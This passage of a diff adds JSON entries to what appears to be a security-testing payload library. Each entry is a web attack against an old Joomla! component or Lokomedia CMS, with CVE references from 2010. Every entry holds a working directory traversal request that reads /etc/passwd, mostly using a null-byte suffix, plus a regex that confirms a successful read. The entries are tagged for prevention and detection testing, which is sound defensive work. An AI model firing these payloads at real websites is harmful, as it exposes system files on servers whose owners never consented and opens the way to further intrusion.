+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_archeryscores&controller=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component MT Fire Eagle 1.2 - Local File Inclusion (Nuclei: CVE-2010-1719)",
+    "payload_external_id": "B8-LFI-094",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1719 by daffainfo] A directory traversal vulnerability in the MT Fire Eagle (com_mtfireeagle) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_mtfireeagle&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Online Market 2.x - Local File Inclusion (Nuclei: CVE-2010-1722)",
+    "payload_external_id": "B8-LFI-095",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1722 by daffainfo] A directory traversal vulnerability in the Online Market (com_market) component 2.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_market&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component iNetLanka Contact Us Draw Root Map 1.1 - Local File Inclusion (Nuclei: CVE-2010-1723)",
+    "payload_external_id": "B8-LFI-096",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1723 by daffainfo] A directory traversal vulnerability in the iNetLanka Contact Us Draw Root Map (com_drawroot) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_drawroot&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component SMEStorage - Local File Inclusion (Nuclei: CVE-2010-1858)",
+    "payload_external_id": "B8-LFI-097",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1858 by daffainfo] A directory traversal vulnerability in the SMEStorage (com_smestorage) component before 1.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_smestorage&controller=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Property - Local File Inclusion (Nuclei: CVE-2010-1875)",
+    "payload_external_id": "B8-LFI-098",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1875 by daffainfo] A directory traversal vulnerability in the Real Estate Property (com_properties) component 3.1.22-03 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_properties&controller=../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component OrgChart 1.0.0 - Local File Inclusion (Nuclei: CVE-2010-1878)",
+    "payload_external_id": "B8-LFI-099",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1878 by daffainfo] A directory traversal vulnerability in the OrgChart (com_orgchart) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_orgchart&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component BeeHeard 1.0 - Local File Inclusion (Nuclei: CVE-2010-1952)",
+    "payload_external_id": "B8-LFI-100",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1952 by daffainfo] A directory traversal vulnerability in the BeeHeard (com_beeheard) and BeeHeard Lite (com_beeheardlite) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component iNetLanka Multiple Map 1.0 - Local File Inclusion (Nuclei: CVE-2010-1953)",
+    "payload_external_id": "B8-LFI-101",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1953 by daffainfo] A directory traversal vulnerability in the iNetLanka Multiple Map (com_multimap) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_multimap&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component iNetLanka Multiple root 1.0 - Local File Inclusion (Nuclei: CVE-2010-1954)",
+    "payload_external_id": "B8-LFI-102",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1954 by daffainfo] A directory traversal vulnerability in the iNetLanka Multiple root (com_multiroot) component 1.0 and 1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Deluxe Blog Factory 1.1.2 - Local File Inclusion (Nuclei: CVE-2010-1955)",
+    "payload_external_id": "B8-LFI-103",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1955 by daffainfo] A directory traversal vulnerability in the Deluxe Blog Factory (com_blogfactory) component 1.1.2 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Gadget Factory 1.0.0 - Local File Inclusion (Nuclei: CVE-2010-1956)",
+    "payload_external_id": "B8-LFI-104",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1956 by daffainfo] A directory traversal vulnerability in the Gadget Factory (com_gadgetfactory) component 1.0.0 and 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Love Factory 1.3.4 - Local File Inclusion (Nuclei: CVE-2010-1957)",
+    "payload_external_id": "B8-LFI-105",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1957 by daffainfo] A directory traversal vulnerability in the Love Factory (com_lovefactory) component 1.3.4 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component J!WHMCS Integrator 1.5.0 - Local File Inclusion (Nuclei: CVE-2010-1977)",
+    "payload_external_id": "B8-LFI-106",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1977 by daffainfo] A directory traversal vulnerability in the J!WHMCS Integrator (com_jwhmcs) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jwhmcs&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Affiliate Datafeeds 880 - Local File Inclusion (Nuclei: CVE-2010-1979)",
+    "payload_external_id": "B8-LFI-107",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1979 by daffainfo] A directory traversal vulnerability in the Affiliate Datafeeds (com_datafeeds) component build 880 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_datafeeds&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Joomla! Flickr 1.0 - Local File Inclusion (Nuclei: CVE-2010-1980)",
+    "payload_external_id": "B8-LFI-108",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1980 by daffainfo] A directory traversal vulnerability in joomlaflickr.php in the Joomla! Flickr (com_joomlaflickr) component 1.0.3 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_joomlaflickr&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Fabrik 2.0 - Local File Inclusion (Nuclei: CVE-2010-1981)",
+    "payload_external_id": "B8-LFI-109",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1981 by daffainfo] A directory traversal vulnerability in the Fabrik (com_fabrik) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JA Voice 2.0 - Local File Inclusion (Nuclei: CVE-2010-1982)",
+    "payload_external_id": "B8-LFI-110",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1982 by daffainfo] A directory traversal vulnerability in the JA Voice (com_javoice) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component redTWITTER 1.0 - Local File Inclusion (Nuclei: CVE-2010-1983)",
+    "payload_external_id": "B8-LFI-111",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1983 by daffainfo] A drectory traversal vulnerability in the redTWITTER (com_redtwitter) component 1.0.x including 1.0b11 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Lokomedia CMS - Local File Inclusion (Nuclei: CVE-2010-2018)",
+    "payload_external_id": "B8-LFI-112",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2018 by r3Y3r53] A Local File Inclusion (LFI) vulnerability exists in Lokomedia CMS. The application allows an attacker to include files on the server that should not be accessible, potentially exposing sensitive information.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/downlot.php?file=../../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Percha Categories Tree 0.6 - Local File Inclusion (Nuclei: CVE-2010-2033)",
+    "payload_external_id": "B8-LFI-113",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2033 by daffainfo] A directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Percha Image Attach 1.1 - Directory Traversal (Nuclei: CVE-2010-2034)",
+    "payload_external_id": "B8-LFI-114",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2034 by daffainfo] A directory traversal vulnerability in the Percha Image Attach (com_perchaimageattach) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_perchaimageattach&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Percha Gallery 1.6 Beta - Directory Traversal (Nuclei: CVE-2010-2035)",
+    "payload_external_id": "B8-LFI-115",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2035 by daffainfo] A directory traversal vulnerability in the Percha Gallery (com_perchagallery) component 1.6 Beta for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_perchagallery&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Percha Fields Attach 1.0 - Directory Traversal (Nuclei: CVE-2010-2036)",
+    "payload_external_id": "B8-LFI-116",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-2036 by daffainfo] A directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
